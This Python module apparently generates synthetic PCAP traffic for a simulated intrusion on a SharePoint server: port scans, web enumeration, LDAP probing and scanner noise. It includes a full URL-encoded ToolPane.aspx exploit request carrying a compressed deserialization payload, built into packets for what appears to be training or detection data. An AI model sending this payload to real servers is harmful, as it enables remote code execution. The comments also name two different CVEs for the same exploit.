"""Scanner and attacker traffic generators."""

from __future__ import annotations

import random
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from ..serializer import FastPacketSerializer

from ..config import (
    DOMAIN_CONTROLLER_IP,
    PUBLIC_SCANNER_IPS,
    RETRANSMISSION_RATE_OTHER,
    SCANNER_BEHAVIORS,
    SCANNER_USER_AGENTS,
    SHAREPOINT_HOSTNAME,
    SHAREPOINT_SERVER_IP,
    SHAREPOINT_VULNERABLE_ENDPOINTS,
)
from ..helpers import (
    generate_realistic_user_agent,
    generate_sharepoint_health_score,
)
from ..logging_setup import get_logger
from ..state import generator, random_pool
from ..tcp import (
    apply_retransmissions_smart,
    create_tcp_ack,
    create_tcp_fin_ack,
    create_tcp_psh_ack,
    create_tcp_rst,
    create_tcp_syn,
    create_tcp_synack,
    exponential_delay,
    tcp_fin_handshake,
    tcp_handshake,
)
from .dns import generate_dns_query, generate_dns_response
from .icmp import generate_icmp_ping, generate_icmp_reply

logger = get_logger(__name__)


def generate_sharepoint_recon_requests(src_ip, dst_ip, attacker_domain, start_time, duration):
    """
    Generate reconnaissance requests from attacker disguised as Slack CDN
    These appear before the exploit POST
    """
    all_packets = []

    exploit_time = start_time + random.uniform(300, 1800)  # 5-30 minutes after start

    # After recon, send exploit POST
    sport = generator.allocate_port(src_ip)
    exploit_packets = generate_exploit_post_request(src_ip, dst_ip, sport, 8080, attacker_domain, exploit_time)
    all_packets.extend(exploit_packets)

    return all_packets


def generate_exploit_post_request(src_ip, dst_ip, sport, dport, domain, start_time):
    """
    Generate the ToolPane.aspx exploit POST request disguised as Slack CDN traffic
    This mimics the CVE-2019-0604 SharePoint RCE exploit
    """
    packets = []
    current_time = start_time

    # TCP handshake
    packets.extend(tcp_handshake(src_ip, dst_ip, sport, dport, current_time))
    current_time += random.uniform(0.01, 0.03)

    conn = generator.get_connection(src_ip, dst_ip, sport, dport)
    conn_server = generator.get_connection(dst_ip, src_ip, dport, sport)

    # Exploit POST request (CVE-2025-53770 - ToolPane.aspx)
    exploit_payload = "MSOTlPn_Uri=http%3a//10.3.10.11%3a8080/_controltemplates/15/AclEditor.ascx&MSOTlPn_DWP=%3c%25%40%20Register%20Tagprefix%3d%22SPWebControls%22%20Namespace%3d%22System.Web.UI%22%20Assembly%3d%22System.Web.Extensions%2c%20Version%3d4.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d31bf3856ad364e35%22%20%25%3e%0a%3c%25%40%20Register%20Tagprefix%3d%22MSPerformancePoint%22%20Namespace%3d%22Microsoft.PerformancePoint.Scorecards%22%20Assembly%3d%22Microsoft.PerformancePoint.Scorecards.Client%2c%20Version%3d16.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d71e9bce111e9429c%22%20%25%3e%0a%20%20%3cSPWebControls%3aUpdateProgress%3e%0a%20%20%20%20%3cProgressTemplate%3e%0a%20%20%20%20%20%20%3cMSPerformancePoint%3aExcelDataSet%20CompressedDataTable%3d%22H4sIAN/dAmkAA9VY6XLbyBG2k8pW4s2/vACL%2bbm2iEOwTRWlKoAgIFAkJPAACGy5anGMAJADkMFBkHi7PEieJekBeMmyLNub9SZQeTjGdPd093z9zQxevHzx4sW/4SG/5PnrH6BRx9s0Q9GZaGf264aOkjRcxpfnZxT5e93o5jjLE3QZozxLbPy6cZc7OHRv0HayXKD40nn3zuZc7i3dZs8R9b79J2L8byc2q2aMMjLXX2YRHrsBiuwfoSeG9/dyYkcvX5KxH/4Izb/%2b3NmkF2kl0thEOE4vm826c7GBfpBlq4tWqyiKs4I9WyZ%2bi6EoujUbDmqze9ko9WDWy2aexDtr6ZsodJNlurzP3rjL6ALk3tRSzUboXTbHdzs/m1evGg3iBcIoQnHWiO0InY43arULJd29uWxmSY4O76cp6uZJAqqDpWtjtBsmZslDTIMDK4w2k%2b0K7V8fhoJl6KJGFMa3rpsnEDMFlu3N/n957Czz2ENe81Rzr/2xz4MwzRRYiUfCz3jysViK/pGj2H1S5qn5pRBhT7fxSXpI0sh0MFyDpLvEGLkZoC49k1GMktA9I37/Qv/88ymOxihZQ2rSMyXOUBLb%2bKy3WdkkFUZir1Yo%2bYU5KBjIOZsqZ4NlKi2TyM5A4XXjOPYtOKfYe%2b7%2b3T1Nexxls/aH14e5wthbFmnt5K0zh1hI9y5ZrkOPzHuXoBSSYpMQJcA7KpbJ4htcYGnnnn3PvbU99u05YrkPHw4xPUjQf6GKP3xoNrJqkWBR7XhLFqz5EJStJ/HSegYwlcBngFeN75D0oDxah/o4FNMnTD1Ur72pKODq1Q%2bEaP75944HzOMnF/WPHX0TadQ6tYnndPYTvVnTu0rsHPjkGGHnWK%2bNnYeEmSa2g4/lkyyL2wRgVfHCTiqw025gxz6ChQnjFCXZI3ronNbigVDD5xn1DRjMbFjJIw17X8DDj9e981G13t6fVufjuvkOTjY%2bDeGDp70aRE8gvQOeEqeRBx0IKNtST9NjZ4iyYOmpUP1XItBBEto4LFGndfL%2bOeU7m5AHJCv9HA2D%2bK5gv0cGwfjFnii8izRLwthvXrWK3nY7GvK8xvP8XQue9wJ/eIouace6yrnsCDvjwtcjfesyeO3MKWow5/Nh97wYdAXRMzaUN%2bvjO4PD3my0NY0iVSSBNqPNyqQyjPTR2mb0/M5QWJXp0WY5ZYaTRanK0%2bJWXEjV/IomTFlcerKeDRbq2pE32GRHK4fhysHCww7MbRvDfMq0tyCzmDI6ZYqSY9B7/7iJd91fOZGbKjJdmiDnyDgE/wxr1i9to53fTbTa5zmfKj2Vdq5HtBtN22CbBt3A6Rb%2b9FoPQW8%2bZnROl9uJZZy3zbnLmhN9rk7Mze1kSFkT/vwWVOpk6aLD6rnHB6LD0IUJeXB97zCnMMWUZdAlzw95wQ9V/pBPDuQ3qWWoFJFzt9y1BflzIzyv4p8JAfRLiP9oN%2bI3Bp1N0EwFm1Q%2bZUeQEy6GGDOXUdcuyXf4W60TqGh%2bhQneJ81CPOn3SCtAjDzf/T%2bPsQplMGNO/TsXFXyIqWcZG2wxEmXpKoklALy8NWcVVhWId2HNlL5AMC30esccmTJp54WyNrfCHPABfoJOl8/A39RkpLktT/2BYfr29YhyxeV6wIzWHsOlDiMtIHelI4PMlp5b8nkO%2bM4GtJqahprMSi1XRTMfTnhqxvqM2uUwAltauXL1GfgYq%2b4e17PeiU160x33LLDhWahUimGpsaahMZahFKbRDyzRL9U5nlviCFsTn72dSDC3Fd3rm0nlC/0ecq8xg3mvUKX2uTrXcmsWYKVr%2bpCrwI01f0Apv5sfgu%2bSlIsmQy8Efkr64ZFjYC1lPYZ1w8AlgDEptWerwJMBU4sA%2bGcEdUzwzCsjWQcMezA2vXYMnbLl9mLIe5k1Gy0dRtvwxVAcSl%2bFj%2bRoU5eceLRF4/YR85EegW/zypeQU4E/QsBL34ms9ZO%2bhr9S318oJNiutiA//W6FWa1696tj06p16HnXuLC0IHBZFTtGP0WaRUHNx9ZMG3uytLWA03UiM5VKl9EzqFlOjAFHkYc9acS5sn5rGjTuRjT25GBt9bjAMaaq9Wi%2bnsD78E8bFl%2b13mF2jG8KnH7d5wQ/JVkp%2bGP9y57BzU1R/R33Hir9H5m7B3mMnagNOcZz4CjNjdrAbWoJ8%2b/xCPxrkdoHjJy31doP8KfwNVZPvWt9a01oqFedciMpBT3NA2zYhjqwZnjqMBl25nSoll6gGkNanfe4YTnCQ9HnQEWuNqFe9h32hsWN4FOE1PsHTP1WOdbMWxKWjJ/Ps%2bC/J6LStObbfr3haP1qEzuu09gyrMM%2bPFjQpP6wu8C5FbUnEMPKNDYrFEnV%2bFhup1BTW6EgVkZVzYm9Y01OIimzNCwC95YuVdVgf8pg8E%2bq8tvF6spiuKBeW%2bVmYhA9fVvV9kg4nAE0qH0PbEPNljypWbL3Fr56yC%2buat6ZaYu7mpuoipvEej%2btCP3uC3KkSCrhGepG%2bkTNPH63EoLK9E8n3AH58XKHJfkDbGNh6zDAf%2bzQ3%2bV9efRZBRxDXrew3o/e7TjW793U8VRxGNXZidqfN6b9%2bmBlmtXmpT/yT5aJXjfrO7FWDkPhcHb68viWxPT2GB/OPXG4BdzuffjaeKpI6sOh6ZDWfXAGrPxbuUw7/73P7F2tAvXN7rdfHcr4hVHHkV52Wrtr2Wfuea0vv%2bh16huzsru2nVzETq/VzatO66HgE3fZ1pdcZjutr7zDf/QNonX6EeLku0fr%2bOFj93WkdfJ5pNP66HPN1asf/wMl6EcbyxYAAA%3d%3d%22%20DataTable-CaseSensitive%3d%22true%22%20runat%3d%22server%22/%3e%0a%20%20%20%20%3c/ProgressTemplate%3e%0a%20%20%3c/SPWebControls%3aUpdateProgress%3e%0a"

    # request = f"POST /_layouts/15/ToolPane.aspx/uepfpteojnmhcrb?DisplayMode=Edit&utfoplxhhe=/ToolPane.aspx HTTP/1.1\r\n"
    request = "POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1\r\n"
    request += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\r\n"
    request += "Referer: http://10.3.10.11/_layouts/SignOut.aspx\r\n"  # Fix referer too
    request += "Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Content-Length: {len(exploit_payload)}\r\n"
    request += "Connection: keep-alive\r\n"
    request += "\r\n"
    request += exploit_payload

    pkt = create_tcp_psh_ack(src_ip, dst_ip, sport, dport, conn.seq, conn.ack, 65535, request.encode(), current_time)
    packets.append(pkt)
    conn.seq += len(request)
    current_time += random.uniform(0.05, 0.15)

    # Server response: 401 Unauthorized (then later 200 OK with reverse shell)
    response = "HTTP/1.1 401 Unauthorized\r\n"
    response += "Cache-Control: private, max-age=0\r\n"
    response += "Content-Type: text/plain; charset=utf-8\r\n"
    response += "Server: Microsoft-IIS/10.0\r\n"
    response += "WWW-Authenticate: NTLM\r\n"
    response += "Content-Length: 16\r\n"
    response += "\r\n"
    response += "401 UNAUTHORIZED"

    pkt = create_tcp_psh_ack(dst_ip, src_ip, dport, sport, conn_server.seq, conn.seq, 65535, response.encode(), current_time)
    packets.append(pkt)
    conn_server.seq += len(response)
    current_time += random.uniform(0.01, 0.03)

    # Client ACK
    pkt = create_tcp_ack(src_ip, dst_ip, sport, dport, conn.seq, conn_server.seq, 65535, current_time)
    packets.append(pkt)

    # FIN handshake
    packets.extend(tcp_fin_handshake(src_ip, dst_ip, sport, dport, current_time))

    return packets


def generate_attacker_phase1_discovery(attacker_ip, target_ip, dc_ip, start_time):
    """Phase 1: Initial Discovery (0-8 minutes)"""
    logger.info("    Phase 1: Initial Discovery (DNS, ICMP)")
    packets = []
    current_time = start_time

    # ICMP ping to SharePoint
    identifier = random_pool.ip_id()
    for seq in range(1, 5):
        # Echo Request
        req = generate_icmp_ping(attacker_ip, target_ip, seq, identifier, current_time)
        packets.append(req)

        # Echo Reply (0.5-2ms RTT)
        reply_time = current_time + random.uniform(0.0005, 0.002)
        reply = generate_icmp_reply(target_ip, attacker_ip, seq, identifier, reply_time)
        packets.append(reply)

        current_time += 1.0  # 1 second between pings

    current_time += random.uniform(10, 30)

    # DNS reconnaissance
    domains_to_query = ["corp.local", "sharepoint.corp.local", "sp-srv01.corp.local", "sql-srv01.corp.local", "dc01.corp.local"]

    for domain in domains_to_query:
        sport = generator.allocate_port(attacker_ip)

        # DNS query
        query, txid, _ = generate_dns_query(attacker_ip, dc_ip, domain, "A", current_time)
        packets.append(query)

        # DNS response (20-80ms later)
        resp_time = current_time + random.uniform(0.020, 0.080)
        response = generate_dns_response(dc_ip, attacker_ip, sport, domain, txid, "A", resp_time)
        packets.append(response)

        current_time += random.uniform(15, 45)  # Slow, patient

    return packets


def generate_attacker_phase2_portscan(attacker_ip, target_ip, start_time):
    """Phase 2: Port Scanning (8-15 minutes)"""
    logger.info("    Phase 2: Port Scanning")
    packets = []
    current_time = start_time + (8 * 60)  # Start at 8 minutes

    ports_to_scan = [80, 443, 8080, 3389, 445, 135, 1433, 3306, 5432]

    for port in ports_to_scan:
        sport = generator.allocate_port(attacker_ip)

        # SYN packet
        syn = create_tcp_syn(attacker_ip, target_ip, sport, port, current_time)
        packets.append(syn)

        # Response (SYN-ACK or RST)
        resp_time = current_time + random.uniform(0.010, 0.050)
        if port in [8080, 3389, 445, 135]:  # Open ports
            # SYN-ACK
            syn_ack = create_tcp_synack(target_ip, attacker_ip, port, sport, random_pool.seq_num(), syn.seq + 1, resp_time)
            packets.append(syn_ack)

            # RST to close (stealth scan - don't complete handshake)
            rst_time = resp_time + random_pool.delay_medium()
            rst = create_tcp_rst(attacker_ip, target_ip, sport, port, syn.seq + 1, rst_time)
            packets.append(rst)
        else:  # Closed ports
            # RST
            rst = create_tcp_rst(target_ip, attacker_ip, port, sport, 0, resp_time)
            packets.append(rst)

        if random.random() < 0.7:
            current_time += random.uniform(2, 8)  # Normal pace
        else:
            current_time += random.uniform(20, 60)  # Slow down to evade detection

    return packets


def _generate_scanner_http_response(status_code, content_length, uri, current_time):
    """Generate HTTP response for scanner traffic."""
    iis_version, _ = generator.get_server_versions("10.3.10.11")

    response_text = f"HTTP/1.1 {status_code} "
    status_messages = {
        200: "OK",
        302: "Found",
        401: "Unauthorized",
        403: "Forbidden",
        404: "Not Found",
        400: "Bad Request",
        405: "Method Not Allowed",
        500: "Internal Server Error",
    }
    response_text += status_messages.get(status_code, "OK") + "\r\n"
    response_text += "Content-Type: text/html; charset=utf-8\r\n"
    response_text += f"Server: {iis_version}\r\n"
    response_text += f"X-SharePointHealthScore: {generate_sharepoint_health_score()}\r\n"
    response_text += "X-Powered-By: ASP.NET\r\n"

    if status_code == 302:
        response_text += "Location: /_layouts/15/start.aspx\r\n"

    response_text += f"Content-Length: {content_length}\r\n"
    response_text += "Connection: close\r\n"
    response_text += "\r\n"
    response_text += "<!-- Response body -->"

    return response_text.encode()


def generate_attacker_phase3_enumeration(attacker_ip, target_ip, start_time):
    """Phase 3: Web Enumeration (15-28 minutes)"""
    logger.info("    Phase 3: Web Enumeration (/_vti_bin/, /_api/, /_layouts/)")
    packets = []
    current_time = start_time + (15 * 60)  # Start at 15 minutes

    # User agents to rotate
    # Attacker rotates User-Agents to evade detection
    attacker_user_agents = [generate_realistic_user_agent() for _ in range(4)]

    # Endpoints to probe
    endpoints = [
        ("/", "GET", 302),
        ("/robots.txt", "GET", 404),
        ("/favicon.ico", "GET", 200),
        ("/_vti_inf.html", "GET", 200),
        ("/_vti_bin/", "GET", 403),
        ("/_vti_bin/owssvr.dll", "GET", 200),
        ("/_vti_bin/lists.asmx", "GET", 200),
        ("/_vti_bin/client.svc", "GET", 200),
        ("/_layouts/", "GET", 302),
        ("/_layouts/15/", "GET", 302),
        ("/_layouts/15/start.aspx", "GET", 401),
        ("/_api/", "GET", 401),
        ("/_api/web", "GET", 401),
        ("/_api/contextinfo", "POST", 403),
        ("/nonexistent.aspx", "GET", 404),
    ]

    for endpoint, method, expected_status in endpoints:
        sport = generator.allocate_port(attacker_ip)

        # TCP handshake
        handshake = tcp_handshake(attacker_ip, target_ip, sport, 8080, current_time)
        packets.extend(handshake)
        current_time += random_pool.delay_handshake()

        conn = generator.get_connection(attacker_ip, target_ip, sport, 8080)
        conn_server = generator.get_connection(target_ip, attacker_ip, 8080, sport)

        # HTTP request
        user_agent = random.choice(attacker_user_agents)
        request_text = f"{method} {endpoint} HTTP/1.1\r\n"
        request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
        request_text += f"User-Agent: {user_agent}\r\n"
        request_text += "Accept: */*\r\n"
        if method == "POST":
            request_text += "Content-Length: 0\r\n"
        request_text += "\r\n"
        request = request_text.encode()

        pkt = create_tcp_psh_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
        packets.append(pkt)
        conn.seq += len(request)
        current_time += exponential_delay(0.005, 0.030, 50)

        # Server ACK
        pkt = create_tcp_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, current_time)
        packets.append(pkt)
        current_time += exponential_delay(0.010, 0.050, 30)

        # HTTP response
        content_length = random_pool.small_int() if expected_status == 200 else random.randint(50, 300)
        response = _generate_scanner_http_response(expected_status, content_length, endpoint, current_time)

        pkt = create_tcp_psh_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)

        packets.append(pkt)
        conn_server.seq += len(response)
        conn.ack = conn_server.seq
        current_time += exponential_delay(0.005, 0.015, 100)

        # Client ACK
        pkt = create_tcp_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, current_time)
        packets.append(pkt)
        current_time += exponential_delay(0.001, 0.005, 200)

        # FIN handshake (close connection)
        fin1 = create_tcp_fin_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, current_time)
        packets.append(fin1)
        current_time += exponential_delay(0.001, 0.005, 200)

        fin2 = create_tcp_fin_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq + 1, 65535, current_time)
        packets.append(fin2)
        current_time += exponential_delay(0.001, 0.005, 200)

        ack = create_tcp_ack(attacker_ip, target_ip, sport, 8080, conn.seq + 1, conn_server.seq + 1, 65535, current_time)
        packets.append(ack)

        # Variable delay between requests (3-20 seconds)
        current_time += random.uniform(3, 20)

    return packets


def generate_attacker_phase4_targeted(attacker_ip, target_ip, start_time):
    """Phase 4: Targeted Probing (28-40 minutes)"""
    logger.info("    Phase 4: Targeted Probing (ToolPane.aspx exploitation attempts)")
    packets = []
    current_time = start_time + (28 * 60)  # Start at 28 minutes

    # Aggressive probing of ToolPane.aspx
    toolpane_payloads = [
        ("/_vti_bin/ToolPane.aspx", "POST", "", 500),  # Empty body
        ("/_vti_bin/ToolPane.aspx", "POST", '<?xml version="1.0"?><test/>', 500),  # Test XML
        ("/_vti_bin/ToolPane.aspx", "POST", "<malformed", 500),  # Malformed
        ("/_vti_bin/ToolPane.aspx", "GET", "", 405),  # Method not allowed
        ("/_layouts/15/viewlsts.aspx", "GET", "", 401),
        ("/_api/web/lists", "GET", "", 401),
        ("/_vti_bin/client.svc/ProcessQuery", "POST", "<Request></Request>", 401),
        ("/_api/search/query?querytext='test'", "GET", "", 401),
    ]

    for endpoint, method, body, expected_status in toolpane_payloads:
        sport = generator.allocate_port(attacker_ip)

        # TCP handshake
        handshake = tcp_handshake(attacker_ip, target_ip, sport, 8080, current_time)
        packets.extend(handshake)
        current_time += random_pool.delay_handshake()

        conn = generator.get_connection(attacker_ip, target_ip, sport, 8080)
        conn_server = generator.get_connection(target_ip, attacker_ip, 8080, sport)

        # HTTP request with payload
        request_text = f"{method} {endpoint} HTTP/1.1\r\n"
        request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
        request_text += "User-Agent: python-requests/2.31.0\r\n"
        request_text += "Accept: */*\r\n"
        if body:
            request_text += f"Content-Length: {len(body)}\r\n"
            request_text += "Content-Type: application/xml\r\n"
            request_text += "\r\n"
            request_text += body
        else:
            request_text += "\r\n"

        request = request_text.encode()

        pkt = create_tcp_psh_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
        packets.append(pkt)
        conn.seq += len(request)
        current_time += exponential_delay(0.005, 0.030, 50)

        # Server response
        response = _generate_scanner_http_response(expected_status, random.randint(50, 500), endpoint, current_time)
        pkt = create_tcp_psh_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)
        packets.append(pkt)

        # Close connection
        current_time += random_pool.delay_handshake()

        # Timing: 5-25 seconds between requests
        current_time += random.uniform(5, 25)

    # LDAP enumeration attempt
    sport = generator.allocate_port(attacker_ip)

    # Try anonymous LDAP bind
    handshake = tcp_handshake(attacker_ip, DOMAIN_CONTROLLER_IP, sport, 389, current_time)
    packets.extend(handshake)
    current_time += random.uniform(0.010, 0.030)

    conn = generator.get_connection(attacker_ip, DOMAIN_CONTROLLER_IP, sport, 389)

    # Anonymous bind
    anon_bind = b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"
    pkt = create_tcp_psh_ack(attacker_ip, DOMAIN_CONTROLLER_IP, sport, 389, conn.seq, conn.ack, 65535, anon_bind, current_time)
    packets.append(pkt)
    current_time += random.uniform(0.010, 0.030)

    # Response: invalidCredentials
    bind_resp = b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x31\x04\x00\x04\x00"
    conn_server = generator.get_connection(DOMAIN_CONTROLLER_IP, attacker_ip, 389, sport)
    pkt = create_tcp_psh_ack(DOMAIN_CONTROLLER_IP, attacker_ip, 389, sport, conn_server.seq, conn.seq + len(anon_bind), 65535, bind_resp, current_time)
    packets.append(pkt)

    return packets


def generate_attacker_phase5_blending(attacker_ip, target_ip, start_time, duration):
    """Phase 5: Persistence and Blending (40-90 minutes)"""
    logger.info("    Phase 5: Persistence and Blending (slow reconnaissance)")
    packets = []
    current_time = start_time + (40 * 60)  # Start at 40 minutes

    # Slow, sporadic requests that blend with normal traffic
    blend_endpoints = [
        ("/_layouts/15/start.aspx", "GET", 401),
        ("/_api/web", "GET", 401),
        ("/_vti_bin/ToolPane.aspx", "POST", 500),
        ("/sites/IT/_api/web", "GET", 401),
        ("/_api/sitepages/pages", "GET", 401),
        ("/sites/IT/SitePages/Home.aspx", "GET", 401),
        ("/_layouts/15/viewlsts.aspx", "GET", 401),
    ]

    request_count = 0
    max_requests = 30  # ~30 requests over 50 minutes

    while current_time < start_time + duration and request_count < max_requests:
        endpoint, method, status = random.choice(blend_endpoints)
        sport = generator.allocate_port(attacker_ip)

        # TCP handshake
        handshake = tcp_handshake(attacker_ip, target_ip, sport, 8080, current_time)
        packets.extend(handshake)
        current_time += random_pool.delay_handshake()

        conn = generator.get_connection(attacker_ip, target_ip, sport, 8080)
        conn_server = generator.get_connection(target_ip, attacker_ip, 8080, sport)

        # HTTP request (looks more legitimate)
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0"
        request_text = f"{method} {endpoint} HTTP/1.1\r\n"
        request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
        request_text += f"User-Agent: {user_agent}\r\n"
        request_text += "Accept: */*\r\n"
        if method == "POST":
            request_text += "Content-Length: 0\r\n"
        request_text += "\r\n"
        request = request_text.encode()

        pkt = create_tcp_psh_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
        packets.append(pkt)
        conn.seq += len(request)
        current_time += exponential_delay(0.010, 0.050, 50)

        # Response
        response = _generate_scanner_http_response(status, random_pool.small_int(), endpoint, current_time)
        pkt = create_tcp_psh_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)
        packets.append(pkt)

        request_count += 1

        # Long delay between requests (20-120 seconds)
        current_time += random.uniform(20, 120)

    return packets


def generate_single_scanner_request(scanner_ip, target_ip, target_port, endpoint_tuple, timestamp):
    """Generate a single HTTP scanner request to SharePoint"""
    method, uri, expected_status = endpoint_tuple
    packets = []
    current_time = timestamp

    sport = generator.allocate_port(scanner_ip)

    # TCP handshake
    packets.extend(tcp_handshake(scanner_ip, target_ip, sport, target_port, current_time))
    current_time += random.uniform(0.010, 0.050)

    conn = generator.get_connection(scanner_ip, target_ip, sport, target_port)
    conn_server = generator.get_connection(target_ip, scanner_ip, target_port, sport)

    # HTTP request with scanner user-agent
    user_agent = random.choice(SCANNER_USER_AGENTS)

    request_text = f"{method} {uri} HTTP/1.1\r\n"
    request_text += f"Host: {target_ip}:{target_port}\r\n"
    request_text += f"User-Agent: {user_agent}\r\n"
    request_text += "Accept: */*\r\n"
    request_text += "Connection: close\r\n"  # Scanners usually close connection

    if method == "POST":
        # Empty or minimal POST body (scanner probing)
        post_body = ""
        if "ToolPane" in uri or "client.svc" in uri:
            # Some scanners send minimal XML/SOAP
            post_body = "<Request></Request>"

        if post_body:
            request_text += "Content-Type: application/xml\r\n"
            request_text += f"Content-Length: {len(post_body)}\r\n"
            request_text += "\r\n"
            request_text += post_body
        else:
            request_text += "Content-Length: 0\r\n"
            request_text += "\r\n"
    else:
        request_text += "\r\n"

    request = request_text.encode()

    pkt = create_tcp_psh_ack(scanner_ip, target_ip, sport, target_port, conn.seq, conn.ack, 65535, request, current_time)
    packets.append(pkt)
    conn.seq += len(request)
    current_time += exponential_delay(0.010, 0.050, 50)

    # Server ACK
    pkt = create_tcp_ack(target_ip, scanner_ip, target_port, sport, conn_server.seq, conn.seq, 65535, current_time)
    packets.append(pkt)
    current_time += exponential_delay(0.020, 0.100, 30)

    iis_version, aspnet_version = generator.get_server_versions("10.3.10.11")

    # HTTP response
    response_text = f"HTTP/1.1 {expected_status} "
    status_messages = {200: "OK", 302: "Found", 401: "Unauthorized", 403: "Forbidden", 404: "Not Found", 400: "Bad Request"}
    response_text += status_messages.get(expected_status, "OK") + "\r\n"
    response_text += "Content-Type: text/html; charset=utf-8\r\n"
    response_text += f"Server: {iis_version}\r\n"
    response_text += f"X-SharePointHealthScore: {generate_sharepoint_health_score()}\r\n"
    response_text += "X-Powered-By: ASP.NET\r\n"

    if expected_status == 302:
        response_text += "Location: /_layouts/15/start.aspx\r\n"

    content_length = random_pool.small_int() if expected_status == 200 else random.randint(50, 300)
    response_text += f"Content-Length: {content_length}\r\n"
    response_text += "Connection: close\r\n"
    response_text += "\r\n"
    response_text += "<!-- Response body -->"

    response = response_text.encode()

    pkt = create_tcp_psh_ack(target_ip, scanner_ip, target_port, sport, conn_server.seq, conn.seq, 65535, response, current_time)
    packets.append(pkt)
    conn_server.seq += len(response)
    conn.ack = conn_server.seq
    current_time += exponential_delay(0.005, 0.015, 100)

    # Client ACK
    pkt = create_tcp_ack(scanner_ip, target_ip, sport, target_port, conn.seq, conn.ack, 65535, current_time)
    packets.append(pkt)
    current_time += exponential_delay(0.001, 0.005, 200)

    # FIN handshake (scanners close connections)
    fin1 = create_tcp_fin_ack(scanner_ip, target_ip, sport, target_port, conn.seq, conn.ack, 65535, current_time)
    packets.append(fin1)
    current_time += exponential_delay(0.001, 0.005, 200)

    fin2 = create_tcp_fin_ack(target_ip, scanner_ip, target_port, sport, conn_server.seq, conn.seq + 1, 65535, current_time)
    packets.append(fin2)
    current_time += exponential_delay(0.001, 0.005, 200)

    ack = create_tcp_ack(scanner_ip, target_ip, sport, target_port, conn.seq + 1, conn_server.seq + 1, 65535, current_time)
    packets.append(ack)

    return packets


def generate_public_scanner_traffic(start_time, duration, serializer: FastPacketSerializer | None = None):
    """Generate realistic public scanner traffic from multiple IPs"""
    logger.info("[+] Generating public internet scanner traffic...")

    use_serializer = serializer is not None
    all_packets = []

    # Each scanner IP gets a behavior profile
    scanner_profiles = []
    for scanner_ip in PUBLIC_SCANNER_IPS:
        behavior_type = random.choice(["aggressive", "moderate", "moderate", "slow", "slow"])
        behavior = SCANNER_BEHAVIORS[behavior_type]

        scanner_profiles.append(
            {
                "ip": scanner_ip,
                "behavior": behavior,
                "type": behavior_type,
            }
        )

    logger.info(f"    Simulating {len(scanner_profiles)} public scanners:")

    # Generate traffic for each scanner
    for profile in scanner_profiles:
        scanner_ip = profile["ip"]
        behavior = profile["behavior"]
        behavior_type = profile["type"]

        # How many requests this scanner will make
        num_requests = random.randint(*behavior["requests_per_hour"])

        # Randomly select endpoints to target
        endpoints_to_scan = random.sample(SHAREPOINT_VULNERABLE_ENDPOINTS, min(behavior["endpoints_targeted"], len(SHAREPOINT_VULNERABLE_ENDPOINTS)))

        logger.info(f"      - {scanner_ip} ({behavior_type}): {num_requests} requests over 24h")

        # REALISTIC: Scanners peak during business hours (more targets online)
        for _i in range(num_requests):
            # Weight requests toward business hours (8AM-6PM)
            hour_offset = random.triangular(0, duration, duration * 0.5)  # Peak at midday
            request_time = start_time + hour_offset

            # Pick random endpoint
            endpoint = random.choice(endpoints_to_scan)

            # Generate request
            request_packets = generate_single_scanner_request(scanner_ip, SHAREPOINT_SERVER_IP, 8080, endpoint, request_time)
            all_packets.extend(request_packets)

    # Apply light retransmissions
    all_packets = apply_retransmissions_smart(all_packets, RETRANSMISSION_RATE_OTHER)

    total_requests = sum(random.randint(*SCANNER_BEHAVIORS[random.choice(["aggressive", "moderate", "slow"])]["requests_per_hour"]) for _ in PUBLIC_SCANNER_IPS)
    logger.info(f"    Public scanner traffic: {len(all_packets)} packets (~{total_requests} total requests)")
    # Write packets if serializer provided, otherwise return
    if use_serializer:
        logger.info(f"    Writing {len(all_packets)} Scanner packets to PCAP...")
        for pkt in all_packets:
            serializer.add_packet(pkt, pkt.time)
        return []  # Return empty (already written)
    else:
        return all_packets  # Return for backward compatibility


def generate_scanner_recon_requests(src_ip, dst_ip, attacker_domain, start_time, duration):
    """Compatibility wrapper for targeted scanner probes."""
    return generate_sharepoint_recon_requests(src_ip, dst_ip, attacker_domain, start_time, duration)


__all__ = [
    "generate_sharepoint_recon_requests",
    "generate_scanner_recon_requests",
    "generate_exploit_post_request",
    "generate_attacker_phase1_discovery",
    "generate_attacker_phase2_portscan",
    "generate_attacker_phase3_enumeration",
    "generate_attacker_phase4_targeted",
    "generate_attacker_phase5_blending",
    "generate_single_scanner_request",
    "generate_public_scanner_traffic",
]
